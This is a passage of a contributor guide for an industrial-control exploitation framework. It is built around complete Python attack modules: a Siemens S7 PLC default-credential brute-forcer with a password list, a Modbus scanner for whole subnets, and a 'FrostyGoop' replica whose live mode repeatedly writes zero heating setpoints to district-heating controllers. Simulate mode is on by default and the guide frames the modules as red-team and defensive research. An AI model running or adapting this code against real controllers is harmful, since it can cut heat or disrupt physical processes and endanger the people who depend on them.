            "https://www.cisa.gov/uscert/ics/advisories/icsa-19-344-04",
        ),
        "devices":          (
            "Siemens SIMATIC S7-300",
            "Siemens SIMATIC S7-400",
            "Siemens SIMATIC S7-1200",
            "Siemens SIMATIC S7-1500",
        ),
        "impact":           "HIGH",
        "exploit_type":     "Default Credentials",
        "source_poc":       "IXF native implementation",
        "cve":              "N/A",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0859"],
        "mitre_tactics":    ["Credential Access"],
    }

    target   = OptIP("",    "Target Siemens S7 PLC IP")
    service  = OptChoice("http", ["http", "ftp", "both"], "Service to test (http/ftp/both)")
    timeout  = OptInteger(5, "Connection timeout (seconds)", min_value=1, max_value=30)
    simulate = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live credential testing")

    # Default credentials sourced from vendor documentation and CISA advisories.
    # Format: (username, password)
    DEFAULT_CREDS: List[Tuple[str, str]] = [
        ("admin",   ""),         # Factory default — blank password
        ("admin",   "admin"),    # Common reset
        ("admin",   "siemens"),  # Vendor default
        ("",        ""),         # Anonymous / no auth
        ("user",    "user"),     # Operator account default
        ("Anon",    ""),         # S7-300 anonymous variant
    ]

    @mute
    def check(self) -> bool:
        """TCP connect probe to HTTP or FTP port."""
        if not self.target:
            return False
        port = 80 if self.service in ("http", "both") else 21
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, port))
            s.close()
            return True
        except Exception:
            return False

    def _test_http(self, username: str, password: str) -> str:
        """Test one credential pair against the S7 web interface."""
        cred = base64.b64encode(f"{username}:{password}".encode()).decode()
        req = urllib.request.Request(
            f"http://{self.target}/",
            headers={"Authorization": f"Basic {cred}", "User-Agent": "IXF/1.0"},
        )
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            if resp.status in (200, 302, 301):
                return "SUCCESS"
            return "FAILED"
        except urllib.error.HTTPError as e:
            if e.code == 401:
                return "FAILED"
            return f"HTTP {e.code}"
        except Exception as e:
            return f"ERROR: {str(e)[:20]}"

    def _test_ftp(self, username: str, password: str) -> str:
        """Test one credential pair against the S7 FTP interface."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, 21, timeout=self.timeout)
            ftp.login(username or "anonymous", password or "anonymous@")
            ftp.quit()
            return "SUCCESS"
        except ftplib.error_perm:
            return "FAILED"
        except Exception as e:
            return f"ERROR: {str(e)[:20]}"

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Siemens S7 Default Credentials Test\n\n"
                    "Target:   {}  Service: {}\n"
                    "Step 1: Connect to S7 web interface (HTTP port 80)\n"
                    "        or FTP interface (port 21)\n"
                    "Step 2: Send HTTP Basic Auth or FTP LOGIN for each credential pair\n"
                    "Step 3: Check response code (200 = success, 401 = fail)\n"
                    "\n"
                    "Credentials tested ({} pairs):\n"
                    "  admin / (blank) | admin / admin | admin / siemens\n"
                    "  (blank) / (blank) | user / user | Anon / (blank)\n"
                    "\n"
                    "Impact: Full PLC web interface access — read ladder logic,\n"
                    "        download/upload programs, change CPU operating mode"
                ).format(self.target, self.service, len(self.DEFAULT_CREDS)),
                mitre_techniques=["T0859"],
            )
            return

        services_to_test = []
        if self.service in ("http", "both"):
            services_to_test.append(("HTTP", 80, self._test_http))
        if self.service in ("ftp", "both"):
            services_to_test.append(("FTP", 21, self._test_ftp))

        for svc_name, svc_port, test_fn in services_to_test:
            print_status("[S7-Creds] Testing {} on {}:{}...".format(
                svc_name, self.target, svc_port))

            results = []
            for username, password in self.DEFAULT_CREDS:
                result = test_fn(username, password)
                display_u = username if username else "(blank)"
                display_p = password if password else "(blank)"
                results.append((display_u, display_p, result))
                if result == "SUCCESS":
                    print_success("[+] Valid {}: '{}' / '{}'".format(
                        svc_name, display_u, display_p))

            print_table(
                ["Username", "Password", "Result"],
                results,
                title=f"{svc_name} Credential Test — {self.target}:{svc_port}",
            )
```

---

## Full Annotated Assessment / MITRE Module Example

```python
"""IXF MITRE T0843 — Program Upload assessment module.

T0843: Program Upload — adversaries upload PLC programs to identify logic
or use device as exfiltration vector. Maps to Collection tactic.

simulate=True always. Assessment modules never modify target state.
"""
from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger, mute,
    print_info, print_status, print_success, print_warning, print_table,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "MITRE T0843 Program Upload — PLC Logic Exfiltration Assessment",
        "description": (
            "Assessment module for MITRE ATT&CK for ICS technique T0843 (Program Upload). "
            "Evaluates detection and prevention controls against unauthorized PLC program "
            "upload attempts. Provides detection recommendations and control mappings "
            "to IEC 62443 and NIST SP 800-82r3."
        ),
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       (
            "https://attack.mitre.org/techniques/T0843/",
            "https://www.cisa.gov/uscert/ics/advisories",
        ),
        "devices":          ("All programmable logic controllers",),
        "impact":           "HIGH",
        "exploit_type":     "APT TTP Replica",
        "source_poc":       "IXF native implementation",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "HIGH",
        "mitre_techniques": ["T0843"],
        "mitre_tactics":    ["Collection"],
    }

    target   = OptIP("",   "Target PLC IP (optional — used for connectivity check)")
    port     = OptPort(102, "S7comm port for connectivity probe (default: 102)")
    simulate = OptBool(True, "Simulate mode (always True for assessment modules)")
    destructive = OptBool(False, "No live action — assessment only")

    @mute
    def check(self) -> bool:
        """Optional connectivity check to S7 port."""
        if not self.target:
            return True  # Assessment runs without a target
        import socket
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        # Assessment modules always print simulation — they never send live traffic.
        DestructiveGate.print_simulation(
            description=(
                "T0843 Program Upload — Attack Scenario\n\n"
                "Stage 1: Discovery\n"
                "  Adversary scans for S7comm (TCP/102), EtherNet/IP (TCP/44818),\n"
                "  or Modbus (TCP/502) to enumerate accessible PLCs.\n\n"
                "Stage 2: Access\n"
                "  Uses engineering software (TIA Portal, RSLogix, GX Works) or\n"
                "  raw protocol client to connect to PLC programming interface.\n\n"
                "Stage 3: Upload\n"
                "  Requests complete PLC program (ladder logic, function blocks).\n"
                "  Program reveals: I/O mapping, interlocks, safety limits, setpoints.\n\n"
                "Stage 4: Analysis\n"
                "  Analyzes program to identify: safety bypass opportunities,\n"
                "  control logic weaknesses, hidden backdoor rungs.\n\n"
                "Real-world examples: TRITON/TRISIS used program upload to understand\n"
                "Schneider Electric SIS logic before injecting malicious rung."
            ),
            mitre_techniques=["T0843"],
        )

        # Print control assessment table
        controls = [
            ("Engineering station access control", "Require auth for S7comm program access", "IEC 62443 CR 1.1"),
            ("PLC write protection switch",         "Enable hardware key/write-protect",       "NIST AC-3"),
            ("Network segmentation",                "Engineering VLAN separate from OT floor", "IEC 62443 SR 5.1"),
            ("Protocol whitelisting",               "Block S7comm from non-engineering hosts", "NIST SC-7"),
            ("Audit logging",                       "Log all PLC connect/program operations",  "NIST AU-12"),
            ("Firmware integrity check",            "Compare program hash vs known-good",      "IEC 62443 SI-1"),
        ]
        print_table(
            ["Control", "Recommendation", "Framework Mapping"],
            controls,
            title="T0843 Detection and Prevention Controls",
        )

        # Print detection indicators
        print_info("\nDetection Indicators:")
        indicators = [
            "S7comm PLC STOP → START sequence without operator action",
            "Program download/upload from non-engineering-station IP",
            "Off-hours S7comm sessions (evenings, weekends)",
            "TIA Portal connections from unexpected workstations",
            "Program changes not reflected in change management system",
        ]
        for ind in indicators:
            print_info("  - " + ind)
```

---

## Full Annotated Malware TTP Module Example

```python
"""IXF FrostyGoop Modbus Heating Attack — Malware TTP Replica.

FrostyGoop (BUSTLEBERM) was used in January 2024 to attack Lviv, Ukraine
district heating infrastructure. The malware sent Modbus write commands to
ENCO controllers, causing 600 apartment buildings to lose heat in winter.

This module replicates the attack technique for red team / defensive research.
simulate=True by default. Live mode sends real Modbus FC16 writes.

References:
  - Dragos: https://www.dragos.com/blog/frostygoop-ics-malware/
  - CISA: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a
"""
import socket
import struct
import time
from typing import List

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger, OptFloat, mute,
    print_error, print_status, print_success, print_info, print_warning,
    print_table, DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "FrostyGoop Modbus Heating Attack — Malware TTP Replica",
        "description": (
            "Replicates FrostyGoop (BUSTLEBERM) malware behavior: sends Modbus FC16 "
            "(Write Multiple Registers) commands to ENCO heating controllers to force "
            "setpoints to minimum values, disabling district heating. Used in the January "
            "2024 Ukraine attack that left 600 apartment buildings without heat. "
            "This module is for authorized red team exercises and defensive research only."
        ),
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       (
            "https://www.dragos.com/blog/frostygoop-ics-malware/",
            "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
            "https://www.mandiant.com/resources/blog/frozenriver-frostygoop",
        ),
        "devices":          (
            "ENCO Controllers (District Heating)",
            "Any Modbus TCP controller (generic replication)",
        ),
        "impact":           "CRITICAL",
        "exploit_type":     "Malware TTP Replica",
        "source_poc":       "https://www.dragos.com/blog/frostygoop-ics-malware/",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0836", "T0855", "T0831"],
        "mitre_tactics":    ["Impair Process Control", "Impact"],
    }

    target      = OptIP("",    "Target ENCO controller IP")
    port        = OptPort(502,  "Modbus TCP port (default: 502)")
    unit_id     = OptInteger(1, "Modbus unit ID", min_value=1, max_value=247)
    reg_addr    = OptInteger(0, "Start register address for setpoint write", min_value=0, max_value=65535)
    setpoint    = OptInteger(0, "Setpoint value to write (0 = minimum heating)", min_value=0, max_value=65535)
    repeat      = OptInteger(1, "Number of times to repeat the write command", min_value=1, max_value=100)
    delay       = OptFloat(1.0, "Delay between repeat writes (seconds)", min_value=0.1, max_value=60.0)
    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live Modbus FC16 writes — WILL affect heating systems")

    @mute
    def check(self) -> bool:
        """TCP connectivity probe to Modbus port."""
        if not self.target:
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            # Send FC04 probe to confirm Modbus response
            probe = struct.pack(">HHHBBHH", 1, 0, 6, self.unit_id, 0x04, 0x0000, 0x0001)
            s.send(probe)
            resp = s.recv(16)
            s.close()
            return len(resp) >= 6 and resp[0:2] == b'\x00\x01'
        except Exception:
            return False

    def _build_fc16_frame(self, trans_id: int, reg_addr: int, value: int) -> bytes:
        """Build Modbus FC16 Write Multiple Registers frame for 1 register."""
        # FC16 payload: [reg_addr:2B][count:2B][byte_count:1B][value:2B]
        payload = struct.pack(">HHBH", reg_addr, 1, 2, value)
        # MBAP header: [trans_id:2B][proto:2B][length:2B][unit_id:1B][FC:1B]
        # Length = 1 (unit_id) + 1 (FC) + len(payload)
        length = 1 + 1 + len(payload)
        header = struct.pack(">HHHBB", trans_id, 0, length, self.unit_id, 0x10)
        return header + payload

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "FrostyGoop Malware TTP Replica — Modbus Heating Attack\n\n"
                    "Attack history:\n"
                    "  January 2024 — Sandworm group deploys FrostyGoop (BUSTLEBERM)\n"
                    "  against Lvivteploenergo district heating utility in Lviv, Ukraine.\n"
                    "  600 apartment buildings lose heat. Temperatures below freezing.\n\n"
                    "Step 1: Identify ENCO controllers on Modbus TCP/502\n"
                    "Step 2: Send FC03 (Read Holding Registers) to enumerate setpoints\n"
                    "Step 3: Write FC16 (Write Multiple Registers) with value=0x0000\n"
                    "        to force heating setpoint to minimum (0°C effective)\n"
                    "Step 4: Repeat write {} time(s) with {:.1f}s delay to prevent recovery\n"
                    "Step 5: Heating loop control loses target temperature reference\n"
                    "Step 6: Physical: radiators cool, buildings lose heat within hours\n\n"
                    "Target:  {}:{} (Unit ID: {})\n"
                    "Register: 0x{:04X} | Setpoint: {} (0x{:04X})\n\n"
                    "MITRE ICS:\n"
                    "  T0836 Modify Parameter (setpoint write)\n"
                    "  T0855 Unauthorized Command Message\n"
                    "  T0831 Manipulation of Control (heating disabled)"
                ).format(
                    self.repeat, self.delay,
                    self.target, self.port, self.unit_id,
                    self.reg_addr, self.setpoint, self.setpoint,
                ),
                mitre_techniques=["T0836", "T0855", "T0831"],
            )
            print_info("Source: https://www.dragos.com/blog/frostygoop-ics-malware/")
            return

        print_warning("[FrostyGoop] LIVE MODE — sending Modbus FC16 writes to {}:{}".format(
            self.target, self.port))

        results = []
        for i in range(self.repeat):
            trans_id = i + 1
            frame = self._build_fc16_frame(trans_id, self.reg_addr, self.setpoint)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))
                s.send(frame)
                resp = s.recv(16)
                s.close()
                # FC16 success: response FC = 0x10, same trans_id
                if len(resp) >= 8 and resp[7] == 0x10:
                    results.append((i + 1, "0x{:04X}".format(self.reg_addr), self.setpoint, "WRITTEN"))
                    print_success("[+] Write {}/{}: register 0x{:04X} = {}".format(
                        i + 1, self.repeat, self.reg_addr, self.setpoint))
                else:
                    results.append((i + 1, "0x{:04X}".format(self.reg_addr), self.setpoint, "NO ACK"))
            except Exception as e:
                results.append((i + 1, "0x{:04X}".format(self.reg_addr), self.setpoint,
                                "ERR: {}".format(str(e)[:20])))

            if i < self.repeat - 1:
                time.sleep(self.delay)

        if results:
            print_table(
                ["Write#", "Register", "Value", "Result"],
                results,
                title="FrostyGoop FC16 Write Results — {}:{}".format(self.target, self.port),
            )
```

---

## check() Implementation — 5 Patterns

### Pattern 1: TCP Connect (most common)

```python
@mute
def check(self) -> bool:
    """TCP connect probe — port open = target reachable."""
    if not self.target:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((self.target, self.port))
        s.close()
        return True
    except Exception:
        return False
```

### Pattern 2: UDP Probe (for protocols like Modbus UDP, BACnet, DNP3)

```python
@mute
def check(self) -> bool:
    """UDP probe — send and wait for any response within timeout."""
    if not self.target:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        # Minimal BACnet Who-Is broadcast probe
        probe = bytes.fromhex("810b000c0120ffff00ff1008")
        s.sendto(probe, (self.target, self.port))
        data, _ = s.recvfrom(1024)
        s.close()
        return len(data) > 0
    except socket.timeout:
        return False  # No response = not reachable or no BACnet
    except Exception:
        return False
```

### Pattern 3: HTTP Response Check

```python
@mute
def check(self) -> bool:
    """HTTP HEAD request — check if web interface is accessible."""
    if not self.target:
        return False
    try:
        import urllib.request
        req = urllib.request.Request(
            "http://{}:{}/".format(self.target, self.port),
            method="HEAD",
        )
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status in (200, 301, 302, 401, 403)
    except Exception:
        return False
```

### Pattern 4: Custom Protocol Probe (S7comm COTP/S7)

```python
@mute
def check(self) -> bool:
    """Send S7 COTP Connect + S7 Setup Communication probe."""
    if not self.target:
        return False
    # COTP Connection Request TPDU
    cotp_cr = bytes.fromhex(
        "0300001611e00000000100c0010ac1020100c2020102"
    )
    # S7 Setup Communication request
    s7_setup = bytes.fromhex(
        "0300001902f08032010000000000080000f0000001000101e0"
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((self.target, self.port))
        s.send(cotp_cr)
        cotp_resp = s.recv(64)
        if len(cotp_resp) < 7 or cotp_resp[5] != 0xD0:  # COTP CC = 0xD0
            s.close()
            return False
        s.send(s7_setup)
        s7_resp = s.recv(64)
        s.close()
        # S7 ACK = 0x32 0x03 at bytes 5-6
        return len(s7_resp) > 7 and s7_resp[5] == 0x32 and s7_resp[6] == 0x03
    except Exception:
        return False
```

### Pattern 5: Always-True (assessment and report modules)

```python
@mute
def check(self) -> bool:
    """Assessment module — always returns True (no connectivity required)."""
    # Assessment modules provide methodology and checklists.
    # They do not require connectivity to run.
    return True
```

---

## run() Implementation Guide

The `run()` method must always follow this structure:

```python
def run(self) -> None:
    # 1. Guard: verify required options are set
    if not self.target:
        print_error("Set 'target' option first.")
        return

    # 2. Simulate branch: ALWAYS first, ALWAYS returns
    if self.simulate:
        DestructiveGate.print_simulation(
            description="...",
            mitre_techniques=["T0NNN"],
        )
        # Optional: print_info() for additional context
        return  # ← MANDATORY: never fall through

    # 3. Live code: implement here
    print_status("[MODULE] Starting against {}:{}".format(self.target, self.port))

    # 4. Use print_* for structured output:
    #    print_status → progress and steps
    #    print_success → findings (vulnerabilities confirmed)
    #    print_info    → informational, non-critical
    #    print_warning → important but non-fatal notices
    #    print_error   → fatal failures (connection refused, etc.)

    # 5. Use print_table for structured results
    print_table(
        ["Column A", "Column B", "Result"],
        [("row1a", "row1b", "SUCCESS")],
        title="Module Results",
    )
```

**Complete simulate branch example:**

```python
if self.simulate:
    DestructiveGate.print_simulation(
        description=(
            "CVE-YYYY-NNNNN Vendor Product — Module Name\n\n"
            "Step 1: {describe step 1}\n"
            "Step 2: {describe step 2}\n"
            "Step 3: {describe expected outcome}\n\n"
            "Target:  {}:{}\n"
            "Impact:  {describe impact to operations}"
        ).format(self.target, self.port),
        mitre_techniques=self.__info__["mitre_techniques"],
    )
    print_info("Reference: {}".format(self.__info__["references"][0]))
    return
```

---

## DestructiveGate.print\_simulation() Reference

`DestructiveGate.print_simulation()` prints the standard IXF simulation block. It is mandatory to call it (and only it) in the simulate branch.

**Signature:**

```python
DestructiveGate.print_simulation(
    description: str,              # Required: human-readable attack description
    mitre_techniques: list[str],   # Required: list of MITRE ICS technique IDs
    impact: str = None,            # Optional: override impact label from __info__
    cve: str = None,               # Optional: override CVE from __info__
    header: str = None,            # Optional: override header line
) -> None
```

**Output format (what the user sees):**

```
  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────
  [i] What would happen:

      CVE-2022-29965 Emerson ROC800 Hardcoded Credentials

      Step 1: Connect to ROC800 on 192.168.1.100:4000 (ROC+ protocol)
      Step 2: Build ROC+ authentication frame with hardcoded creds
      ...

  [i] MITRE ATT&CK for ICS: T0859 (Valid Accounts), T0813 (Denial of Control)
  ─────────────────────────────────────────────────────────────
  [i] Run with simulate=False and destructive=True to execute live
      (authorized lab environments only)
```

**Parameters in detail:**

| Parameter | Required | Default | Notes |
|-----------|----------|---------|-------|
| `description` | Yes | - | Multi-line string. Use `\n` for line breaks. Use `.format()` to embed option values (target, port). |
| `mitre_techniques` | Yes | - | List of ICS technique IDs: `["T0836", "T0855"]`. Must match `__info__["mitre_techniques"]`. |
| `impact` | No | from `__info__` | Override only when module impact differs from default. |
| `cve` | No | from `__info__` | Override when simulating a different CVE than the module default. |
| `header` | No | `"SIMULATE MODE — no packets sent"` | Override for assessment modules. |

**Best practices:**

- Always format `description` with `self.target` and `self.port` so the user sees their configured values.
- Include numbered steps matching the actual attack flow.
- List real-world examples when the module replicates a known attack (e.g., FrostyGoop, TRITON).
- Include the impact to physical operations (not just the technical outcome).

---

## Adding Vendor-Specific Options

When a module targets a specific vendor's proprietary protocol, add vendor-specific options:

```python
class Exploit(Exploit):
    __info__ = { ... }

    # Standard options
    target   = OptIP("",    "Target IP")
    port     = OptPort(102,  "S7comm port")
    simulate = OptBool(True, "Simulate mode")
    destructive = OptBool(False, "Enable live exploitation")

    # Vendor-specific options — add after standard options
    rack    = OptInteger(0, "S7 CPU rack number (default: 0)", min_value=0, max_value=7)
    slot    = OptInteger(1, "S7 CPU slot number (default: 1)", min_value=0, max_value=31)
    cpu_type = OptChoice("1200", ["300", "400", "1200", "1500"], "Target S7 CPU series")
    pdu_size = OptInteger(240, "S7 PDU size negotiation", min_value=128, max_value=960)

    def run(self) -> None:
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Target: {}:{} (Rack={}, Slot={}, CPU=S7-{})\n"
                    "..."
                ).format(self.target, self.port, self.rack, self.slot, self.cpu_type),
                mitre_techniques=["T0843"],
            )
            return
        # Access vendor options via self.rack, self.slot, etc.
        print_status("Connecting to S7-{} at {}:{} rack={} slot={}".format(
            self.cpu_type, self.target, self.port, self.rack, self.slot))
```

---

## Using @mute and @multi Decorators

### @mute

Suppresses all `print_*` output inside a decorated method. **Always apply to `check()`.**

```python
from industrialxpl.core.exploit import mute

@mute
def check(self) -> bool:
    # print_* calls here are silenced — no output to console
    print_status("This will NOT appear")
    return True
```

Why: `check()` is called automatically by `autocheck` and batch scanners. Suppressing output prevents noise when multiple checks run in parallel.

### @multi

Enables multi-target iteration. The decorated method receives one target at a time from a list.

```python
from industrialxpl.core.exploit import multi

@multi
def run(self) -> None:
    # self.target is automatically set to each host in turn
    # The @multi decorator handles iteration over self.targets list
    if self.simulate:
        DestructiveGate.print_simulation(
            description="Scanning {}:{}...".format(self.target, self.port),
            mitre_techniques=["T0888"],
        )
        return
    result = self.check()
    print_info("[{}] {}".format(self.target, "UP" if result else "DOWN"))
```

---

## Multi-Target Scanning with @multi

To scan a subnet or list of hosts, use `OptCIDR` with the `@multi` decorator:

```python
"""IXF Multi-Target Modbus Scanner — scan a CIDR range for Modbus TCP devices."""
import socket
import struct
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptPort, OptInteger, OptCIDR, mute,
    print_status, print_success, print_info, print_table, DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Multi-Target Modbus TCP Scanner",
        "description":      "Scan a CIDR range for Modbus TCP-responsive devices.",
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       ("https://modbus.org/",),
        "devices":          ("Any Modbus TCP device",),
        "impact":           "LOW",
        "exploit_type":     "Service Detection",
        "source_poc":       "IXF native implementation",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "INFO",
        "mitre_techniques": ["T0888"],
        "mitre_tactics":    ["Discovery"],
    }

    network  = OptCIDR("192.168.1.0/24", "Target network CIDR (e.g. 10.0.0.0/16)")
    port     = OptPort(502, "Modbus TCP port")
    timeout  = OptInteger(2, "Per-host timeout (seconds)", min_value=1, max_value=10)
    threads  = OptInteger(50, "Concurrent scan threads", min_value=1, max_value=256)
    simulate = OptBool(True, "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable active scanning")

    _PROBE = struct.pack(">HHHBBHH", 1, 0, 6, 1, 0x04, 0x0000, 0x0001)

    @mute
    def check(self) -> bool:
        return True  # Always True — range scanning does not use check()

    def _probe_host(self, host: str) -> tuple:
        """Probe a single host. Returns (host, is_modbus)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, self.port))
            s.send(self._PROBE)
            resp = s.recv(16)
            s.close()
            is_modbus = len(resp) >= 6 and resp[0:2] == b'\x00\x01'
            return (host, is_modbus)
        except Exception:
            return (host, False)

    def run(self) -> None:
        if self.simulate:
            hosts = list(ipaddress.ip_network(self.network, strict=False).hosts())
            DestructiveGate.print_simulation(
                description=(
                    "Multi-Target Modbus TCP Scanner\n\n"
                    "Network: {}\n"
                    "Hosts:   {} addresses to scan\n"
                    "Port:    {}\n"
                    "Threads: {}\n\n"
                    "Step 1: Enumerate all hosts in {}\n"
                    "Step 2: Send FC04 probe to each host on port {}\n"
                    "Step 3: Validate Transaction ID echo in response\n"
                    "Step 4: Report all responsive Modbus devices"
                ).format(
                    self.network, len(hosts), self.port,
                    self.threads, self.network, self.port,
                ),
                mitre_techniques=["T0888"],
            )
            return

        hosts = list(ipaddress.ip_network(self.network, strict=False).hosts())
        print_status("[Multi-Modbus] Scanning {} hosts on port {}...".format(
            len(hosts), self.port))

        found = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._probe_host, str(h)): str(h) for h in hosts}
            for future in as_completed(futures):
                host, is_modbus = future.result()
                if is_modbus:
                    found.append((host, str(self.port), "MODBUS TCP"))
                    print_success("[+] Modbus: {}".format(host))

        if found:
            print_table(
                ["Host", "Port", "Protocol"],
                found,
                title="Modbus Devices Found in {}".format(self.network),
            )
        else:
            print_info("No Modbus devices found in {}".format(self.network))
```

---

## Validation Command and Expected Output

Run this command to validate all modules (including yours) after adding a new file:

```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit

mods = index_modules()
errs = []
for m in mods:
    try:
        cls = import_exploit('industrialxpl.modules.' + m)
        obj = cls()
        info = obj.get_info()
        # Validate required __info__ keys
        required = ['name','description','authors','references','devices',
                    'impact','exploit_type','source_poc','cve','cvss',
                    'severity','mitre_techniques','mitre_tactics']
        missing = [k for k in required if k not in info]
        if missing:
            errs.append((m, 'Missing keys: ' + ', '.join(missing)))
    except Exception as e:
        errs.append((m, str(e)))

print(f'{len(mods)} modules indexed | {len(errs)} errors')
if errs:
    for m, e in errs:
        print(f'  ERR {m}: {e}')
else:
    print('All modules valid.')
"
```

**Expected output (all passing):**

```
976 modules indexed | 0 errors
All modules valid.
```

**Output when your module has an error:**

```
977 modules indexed | 1 errors
  ERR cve.myvendor.cve_2024_12345_example: Missing keys: cvss, severity
```

**Test your specific module:**

```bash
python -c "
from industrialxpl.core.exploit.utils import import_exploit

# Replace with your actual module path (dot notation, no .py)
cls = import_exploit('industrialxpl.modules.cve.myvendor.cve_2024_12345_example')
obj = cls()

print('Name:    ', obj.get_info()['name'])
print('CVE:     ', obj.get_info()['cve'])
print('Impact:  ', obj.get_info()['impact'])
print('check(): ', obj.check())
print()
print('--- run() output (simulate mode) ---')
obj.run()   # Runs in simulate mode by default (simulate=True)
"
```

**Expected output:**

```
Name:     CVE-2024-12345 Example Vendor Module
CVE:      CVE-2024-12345
Impact:   CRITICAL
check():  False

--- run() output (simulate mode) ---
  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────
  [i] What would happen:
      ...
  [i] MITRE ATT&CK for ICS: T0866
  ─────────────────────────────────────────────────────────────
```

---

## PR Submission Workflow

1. **Fork the repository:**

   ```bash
   # On GitHub: click Fork on https://github.com/mrhenrike/IndustrialXPL-Forge
   git clone https://github.com/YOUR_HANDLE/IndustrialXPL-Forge.git
   cd IndustrialXPL-Forge
   ```

2. **Create a feature branch:**

   ```bash
   # Branch name: add-cve-YYYY-NNNNN or add-scanner-<protocol>
   git checkout -b add-cve-2024-12345
   ```

3. **Add your module file and `__init__.py`:**

   ```bash
   # Create directory if new
   mkdir -p industrialxpl/modules/cve/myvendor
   touch industrialxpl/modules/cve/myvendor/__init__.py

   # Add your module
   cp /path/to/my_module.py industrialxpl/modules/cve/myvendor/cve_2024_12345_desc.py
   ```

4. **Run the validation command:**

   ```bash
   python -c "
   from industrialxpl.core.exploit.utils import index_modules, import_exploit
   mods = index_modules()
   errs = []
   for m in mods:
       try:
           import_exploit('industrialxpl.modules.' + m)()
       except Exception as e:
           errs.append((m, str(e)))
   print(f'{len(mods)} modules | {len(errs)} errors')
   if errs:
       for m, e in errs: print(f'  ERR {m}: {e}')
   "
   ```

   Errors must be 0 before proceeding.

5. **Run your module in simulate mode:**

   ```bash
   ixf use cve/myvendor/cve_2024_12345_desc run
   # Verify simulation output is complete and accurate
   ```

6. **Run the contribution checklist** (all items must pass):

   - [ ] `simulate=True` is the default value
   - [ ] `check()` is decorated with `@mute` and returns `bool`
   - [ ] `run()` calls `DestructiveGate.print_simulation()` when `simulate=True`
   - [ ] `run()` returns immediately after simulation (no fall-through)
   - [ ] `__info__` has ALL 13 required keys with valid values
   - [ ] Impact level accurately reflects the operational risk
   - [ ] No hardcoded credentials, tokens, API keys, or secrets in source
   - [ ] All `references` URLs are real, publicly accessible advisories
   - [ ] Module file is in the correct directory following naming convention
   - [ ] `__init__.py` exists in every new directory

7. **Commit and push:**

   ```bash
   git add industrialxpl/modules/cve/myvendor/__init__.py
   git add industrialxpl/modules/cve/myvendor/cve_2024_12345_desc.py
   git commit -m "Add CVE-2024-12345 Vendor Product exploit module"
   git push origin add-cve-2024-12345
   ```

8. **Open a Pull Request** on GitHub with:
   - Title: `Add CVE-YYYY-NNNNN <Vendor> <Product> <Type>`
   - Description: CVE ID, CVSS, affected devices, MITRE techniques, simulate output screenshot
   - Link to the official advisory

See [CONTRIBUTING.md](../../CONTRIBUTING.md) for the code of conduct and review criteria.

---

## Module Testing Without Nmap / External Tools

IXF modules are self-contained and do not require Nmap, Metasploit, or any external tool to develop and test. All testing is done with the Python stdlib and IXF's own `check()` / `run()` methods.

### Testing against a simulated target (no live device needed)

```python
"""Test harness: spin up a TCP echo server and test your module against it."""
import threading
import socket

from industrialxpl.core.exploit.utils import import_exploit

def _tcp_echo_server(host: str, port: int, stop_event: threading.Event) -> None:
    """Minimal TCP server that accepts connections and echoes data."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(5)
        srv.settimeout(1)
        while not stop_event.is_set():
            try:
                conn, _ = srv.accept()
                data = conn.recv(1024)
                conn.send(data)  # Echo back
                conn.close()
            except socket.timeout:
                continue

# Start test server
stop = threading.Event()
server_thread = threading.Thread(
    target=_tcp_echo_server, args=("127.0.0.1", 9999, stop), daemon=True
)
server_thread.start()

# Load and test your module
cls = import_exploit("industrialxpl.modules.cve.myvendor.cve_2024_12345_desc")
obj = cls()
obj.target = "127.0.0.1"
obj.port = 9999

print("check() result:", obj.check())  # Should be True (server is up)
print()
print("run() in simulate mode:")
